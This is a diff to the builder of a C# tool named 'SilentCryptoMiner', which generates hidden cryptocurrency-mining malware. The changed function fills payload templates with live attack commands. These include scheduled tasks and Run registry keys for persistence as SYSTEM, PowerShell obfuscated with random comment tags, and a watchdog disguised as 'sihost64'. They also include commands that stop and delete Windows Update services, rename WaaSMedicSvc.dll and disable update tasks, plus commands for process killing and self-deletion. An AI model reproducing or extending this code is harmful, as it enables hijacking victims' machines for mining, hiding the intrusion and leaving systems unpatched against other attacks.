@@ -486,6 +486,8 @@ namespace SilentCryptoMiner
 
         public static void ReplaceGlobals(ref StringBuilder stringb)
         {
+            bool systemadmincheck = F.toggleRunSystem.Checked && F.toggleAdministrator.Checked;
+
             if (F.mineXMR)
             {
                 stringb.Replace("DefXMR", "true");
@@ -573,7 +575,7 @@ namespace SilentCryptoMiner
                         }
                 }
 
-                if (F.toggleRunSystem.Checked && F.toggleAdministrator.Checked)
+                if (systemadmincheck)
                 {
                     installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)";
                 }
@@ -620,7 +622,7 @@ namespace SilentCryptoMiner
                 stringb.Replace("%v4%", F.txtAssemblyVersion4.Text);
             }
 
-            stringb.Replace("$LIBSROOT", F.chkInstall.Checked && F.toggleRunSystem.Checked && F.toggleAdministrator.Checked ? "Environment.SpecialFolder.ProgramFiles" : "Environment.SpecialFolder.ApplicationData");
+            stringb.Replace("$LIBSROOT", F.chkInstall.Checked && systemadmincheck ? "Environment.SpecialFolder.ProgramFiles" : "Environment.SpecialFolder.ApplicationData");
             stringb.Replace("$PAYLOADCOMMAND", "string.Format(\"#ECTEMPLATE\", Convert.ToBase64String(Encoding.Unicode.GetBytes(string.Format(\"#STARTPROGRAM\", _rplp_.Replace(\"'\", \"''\")))))");
 
             ReplaceEncrypt(stringb, "#LIBSPATH", @"Google\Libs\");
@@ -630,16 +632,16 @@ namespace SilentCryptoMiner
             ReplaceEncrypt(stringb, "#EID", F.eid);
             ReplaceEncrypt(stringb, "#WATCHDOGNAME", "sihost64");
 
-            ReplaceEncrypt(stringb, "#WIN7TASKSCHADD", $"/c schtasks /create /f /sc onlogon /rl highest {(F.toggleRunSystem.Checked && F.toggleAdministrator.Checked ? "/ru \"System\"" : "")} /tn \"{F.txtInstallEntryName.Text}\" /tr \"\\\"{{0}}\\\"\"");
+            ReplaceEncrypt(stringb, "#WIN7TASKSCHADD", $"/c schtasks /create /f /sc onlogon /rl highest {(systemadmincheck ? "/ru \"System\"" : "")} /tn \"{F.txtInstallEntryName.Text}\" /tr \"\\\"{{0}}\\\"\"");
             ReplaceEncrypt(stringb, "#WIN7TASKSCHSTART", $"/c schtasks /run /tn \"{F.txtInstallEntryName.Text}\"");
 
-            ReplaceEncrypt(stringb, "#TASKSCHADD", $"<#{F.Randomi(F.rand.Next(2, 5), false)}#> Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'powershell' -Argument '{{2}}') <#{F.Randomi(F.rand.Next(2, 5), false)}#> -Trigger (New-ScheduledTaskTrigger {(F.toggleRunSystem.Checked && F.toggleAdministrator.Checked ? "-AtStartup" : "-AtLogOn")}) <#{F.Randomi(F.rand.Next(2, 5), false)}#> -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000)) <#{F.Randomi(F.rand.Next(2, 5), false)}#> -TaskName '{F.txtInstallEntryName.Text.Replace("'", "''")}' {(F.toggleRunSystem.Checked && F.toggleAdministrator.Checked ? "-User 'System'" : "")} -RunLevel 'Highest' -Force <#{F.Randomi(F.rand.Next(2, 5), false)}#>; Copy-Item '{{1}}' -Destination '{{0}}' -Force <#{F.Randomi(F.rand.Next(2, 5), false)}#>; {(F.FormAO.toggleRunInstall.Checked ? $"Start-ScheduledTask <#{F.Randomi(F.rand.Next(2, 5), false)}#> -TaskName '{F.txtInstallEntryName.Text.Replace("'", "''")}';" : "")}");
+            ReplaceEncrypt(stringb, "#TASKSCHADD", $"<#{F.Randomi(F.rand.Next(2, 5), false)}#> Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute {(systemadmincheck ? "'powershell' -Argument '{2}'" : "'\"{0}\"'")}) <#{F.Randomi(F.rand.Next(2, 5), false)}#> -Trigger (New-ScheduledTaskTrigger {(F.toggleRunSystem.Checked && F.toggleAdministrator.Checked ? "-AtStartup" : "-AtLogOn")}) <#{F.Randomi(F.rand.Next(2, 5), false)}#> -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000)) <#{F.Randomi(F.rand.Next(2, 5), false)}#> -TaskName '{F.txtInstallEntryName.Text.Replace("'", "''")}' {(F.toggleRunSystem.Checked && F.toggleAdministrator.Checked ? "-User 'System'" : "")} -RunLevel 'Highest' -Force <#{F.Randomi(F.rand.Next(2, 5), false)}#>; Copy-Item '{{1}}' -Destination '{{0}}' -Force <#{F.Randomi(F.rand.Next(2, 5), false)}#>; {(F.FormAO.toggleRunInstall.Checked ? $"Start-ScheduledTask <#{F.Randomi(F.rand.Next(2, 5), false)}#> -TaskName '{F.txtInstallEntryName.Text.Replace("'", "''")}';" : "")}");
             ReplaceEncrypt(stringb, "#TASKSCHREM", $"/c schtasks /delete /f /tn \"{F.txtInstallEntryName.Text}\"");
             ReplaceEncrypt(stringb, "#REGADD", $"/c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /t REG_SZ /f /d \"\\\"{{0}}\\\"\"");
             ReplaceEncrypt(stringb, "#REGREM", $"/c reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /f");
             ReplaceEncrypt(stringb, "#POWERCFG", @"/c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0");
             ReplaceEncrypt(stringb, "#WUPDATE", "/c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc /f & takeown /f %SystemRoot%\\System32\\WaaSMedicSvc.dll & icacls %SystemRoot%\\System32\\WaaSMedicSvc.dll /grant *S-1-1-0:F /t /c /l /q & rename %SystemRoot%\\System32\\WaaSMedicSvc.dll WaaSMedicSvc_BAK.dll & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AUOptions /d 2 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AutoInstallMinorUpdates /d 0 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /d 1 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoRebootWithLoggedOnUsers /d 1 /t REG_DWORD /f & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\sih\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\sihboot\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistant\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantCalendarRun\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantWakeupRun\" /DISABLE");
-            ReplaceEncrypt(stringb, "#STARTPROGRAM", $"<#{F.Randomi(F.rand.Next(2, 5), false)}#> Start-Process -FilePath '{{0}}' -Verb RunAs <#{F.Randomi(F.rand.Next(2, 5), false)}#>");
+            ReplaceEncrypt(stringb, "#STARTPROGRAM", $"<#{F.Randomi(F.rand.Next(2, 5), false)}#> Start-Process -FilePath '{{0}}' {(F.toggleAdministrator.Checked ? "-Verb RunAs" : "")} <#{F.Randomi(F.rand.Next(2, 5), false)}#>");
             ReplaceEncrypt(stringb, "#CMDKILL", "/c taskkill /f /PID \"{0}\"");
             ReplaceEncrypt(stringb, "#CMDDELETE", "/c choice /C Y /N /D Y /T 3 & Del \"{0}\"");
 
